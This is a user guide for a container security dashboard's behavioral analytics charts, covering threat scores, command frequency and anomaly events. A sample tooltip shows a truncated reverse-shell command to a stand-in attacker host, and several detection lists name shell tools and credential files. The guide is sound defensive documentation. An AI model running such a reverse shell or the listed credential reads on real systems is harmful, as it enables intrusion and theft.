# Behavioral Analytics - Interactive Tooltips & Units Guide

## Overview
The **Behavioral Analytics** view now features interactive tooltips, axis labels, units, and legends for all three visualization charts. Simply **hover your mouse** over any graph element to see detailed information with explanations.

---

## 📈 **THREAT LEVEL TREND** Chart

### What It Shows
- **Line Graph** tracking security threat assessment over time
- **Y-Axis**: Threat score (0-100 scale)
- **X-Axis**: Time progression (number of samples collected)

### Units & Scale
| Range | Meaning |
|-------|---------|
| **0-20** | ✅ Safe (Low risk) |
| **21-50** | ⚠️ Caution (Medium risk) |
| **51-80** | 🔴 Alert (High risk) |
| **81-100** | 🚨 Critical (Severe threat) |

### How to Read It
- **Blue line**: Current threat trajectory
- **Light blue fill**: Threat area under the curve
- **Smooth curve**: Indicates gradual threat changes
- **Sharp spikes**: Indicates sudden threat detection

### Interactive Tooltip
**Hover over the line** to see:
```
Threat Score: 65.2 / 100
Aggregate security threat level assessment
```

### Legend Info
Shown in top-right corner:
- Blue line = Continuous threat assessment
- Score is recalculated with each anomaly detection event
- Higher values = More security concern

---

## 📊 **COMMAND FREQUENCY ANALYSIS** Chart

### What It Shows
- **Bar Chart** showing the top 5 most-executed commands
- Horizontal bars represent execution count
- Darker blue = Most frequently run command

### Units & Measurement
```
Execution Count:
- Each bar = number of times that command has run
- Example: "ls" bar showing "45 executions" = command ran 45 times
- Counted across all pods in the cluster
```

### How to Read It
| Height | Meaning |
|--------|---------|
| **Tallest bar** | 1st most command (100% relative height) |
| **Medium bar** | Less frequently used (50-99% height) |
| **Short bar** | Rarely executed command (1-49% height) |

### Interactive Tooltip
**Hover over any bar** to see:
```
Command: busybox
100 times executed
Total invocations of this command in pods
```

### Legend Info
```
💡 Hover over bars to see execution count
```

**Commands can indicate**:
- ✅ **Normal**: `ls`, `cat`, `pwd`, `echo` = routine operations
- ⚠️ **Suspicious**: `chmod`, `curl`, `wget` = potential compromise
- 🚨 **Critical**: `nc`, `bash`, `sh`, `/etc/shadow` = likely misconfiguration or attack

---

## 🔥 **ANOMALY SCORE HEATMAP** 

### What It Shows
- **Vertical Bar Chart** with 40 most recent events
- Each thin vertical bar = one security event
- **Height** = threat severity (0-100 scale)
- **Color** = event classification

### Color Meanings
| Color | Meaning |
|-------|---------|
| 🟢 **GREEN** | Normal activity (safe) |
| 🔴 **RED** | Anomaly detected (threat) |

### Height/Threat Score Scale
```
Height [%]  | Threat Severity
0-20        | Benign event
21-50       | Suspicious pattern
51-80       | High-risk behavior
81-100      | Critical threat
```

### Interactive Tooltip
**Hover over any bar** to see:
```
⚠️ ANOMALY EVENT                    (or ✓ NORMAL EVENT)
75.3 / 100 threat
/bin/bash -i >& /dev/tcp/attacker.com ... | Pod: web-app-1 | 14:32:45
```

### Legend
```
🟥 Red = Anomaly (threat detected)
🟩 Green = Normal (safe activity)
Height = Threat Score 0-100
```

### Reading the Timeline
- **Mostly green**: Healthy cluster, normal operations
- **Mix of red/green**: Some suspicious activity, possible testing
- **Mostly red**: Active attack detected, immediate action needed
- **Clustered reds**: Coordinated attack pattern or configuration issue
- **Single red spikes**: Isolated incidents, may be false positives

---

## 📌 **Threat Scoring Explained**

The threat score calculation considers:

| Factor | Impact | Notes |
|--------|--------|-------|
| Anomaly Detection | High | ML model identifies unusual command patterns |
| Privilege Escalation | Critical | Unexpected `sudo`, `su`, or kernel ops |
| Data Exfiltration | Critical | Connections to external IPs, file compression |
| Container Escape | Critical | Attempts to access host kernel or /var/run/docker.sock |
| Lateral Movement | High | SSH/RDP attempts between pods |
| Persistence Mechanisms | High | Cron jobs, systemd units, init.d changes |
| Credential Theft | High | /etc/shadow access, env variable dumps |
| Command Obfuscation | Medium | Base64, hex encoding, shell metacharacters |
| Behavior Baseline Deviation | Medium | Deviation from learned pod profile |

---

## 🎯 **Tips for Interpreting Behavioral Analytics**

### ✅ **Healthy Cluster Indicators**
- Threat Level Trend: Stays below 30
- Command Frequency: Consistent, repeating patterns (kubectl, logs, etc.)
- Anomaly Heatmap: Mostly green, rare reds
- All changes are gradual, no sharp spikes

### ⚠️ **Warning Signs (Investigate)**
- Threat Level: Climbing above 50
- New commands appearing: `nc`, `wget`, `curl`, `/etc/passwd`
- Heatmap: More red than usual
- Sudden spikes in Command Frequency

### 🚨 **Critical Alerts (Immediate Action)**
- Threat Level: Above 80
- Anomaly Score: 90+ in single event
- Multiple red bars in quick succession (coordinated attack)
- Commands: `docker`, `/var/run/docker.sock`, `/proc/<pid>/environ`

---

## 🔧 **Using Tooltips Effectively**

### Desktop Users
1. **Move mouse** to hover over any chart element
2. **Tooltip appears** within 100ms
3. **Read units, values, and explanations** in the popup
4. **Move away** to hide tooltip

### Mobile Users (Limited Support)
- Long-press on chart elements for tooltip preview
- Tooltips may appear off-screen; scroll to see full content
- Use landscape mode for better chart visibility

---

## 📊 **Chart Refresh Rate**

| Chart | Update Frequency | Reason |
|-------|------------------|--------|
| Threat Level Trend | Every 3 seconds | Real-time threat assessment |
| Command Frequency | Every 3 seconds | As new commands are executed |
| Anomaly Heatmap | Every 3 seconds | New events appear immediately |

> **Note**: Threat scores are updated whenever new events are processed from the kernel event log.

---

## 🛠️ **Troubleshooting**

### "Collecting telemetry..." message
- **Meaning**: Less than 2 data points collected yet
- **Action**: Wait 10 seconds, data will populate
- **Note**: Dashboard needs baseline before showing trends

### No heatmap bars visible
- **Meaning**: No events have occurred in the last check interval
- **Action**: Run an attack simulation via "Shared Kernel" terminal
- **See**: `attack_simulation/shared_kernel_app.py` or `TEST_COMMANDS.md`

### Charts look blank after switching to Behavioral view
- **Meaning**: Dashboard tab wasn't active when data arrived
- **Action**: Click "Refresh" button in the top-right corner
- **Alternative**: Switch away and back to Behavioral view

### Tooltip appears off-screen
- **Meaning**: Chart position near screen edge
- **Action**: Move mouse cursor more to the center of the screen
- **Note**: Tooltip uses fixed positioning, adjust browser zoom if needed

---

## 🎓 **Examples**

### Example 1: Normal Web Application
**Threat Level**: 15-35 (low-medium)
**Top Commands**: `curl`, `python`, `node`, `apt-get`
**Heatmap**: 95% green
**Interpretation**: ✅ Expected application behavior, safe to monitor

### Example 2: Active Attack Simulation
**Threat Level**: Spike from 20 → 85
**Top Commands**: `bash`, `nc`, `wget`, `dd`, `/etc/passwd`
**Heatmap**: Rapid red bars (5-10 in 10 seconds)
**Interpretation**: 🚨 Coordinated attack detected, quarantine pod immediately

### Example 3: Configuration Change
**Threat Level**: Gradual increase 40 → 60
**Top Commands**: New tool install (`git`, `gcc`, `make`)
**Heatmap**: Mix of green/yellow with occasional red anomalies
**Interpretation**: ⚠️ Planned infrastructure work detected, verify with ops team first

---

## 🔗 **Related Documentation**
- [Framework Guide](./framework_guide.txt) - Project structure & log locations
- [TEST_COMMANDS.md](./attack_simulation/TEST_COMMANDS.md) - Simulation scenarios
- [MITRE ATT&CK Mapping](./mitre/mitre_mapper.py) - Threat technique classification

---

**Last Updated**: April 2026 | LOTLGuard v2.1
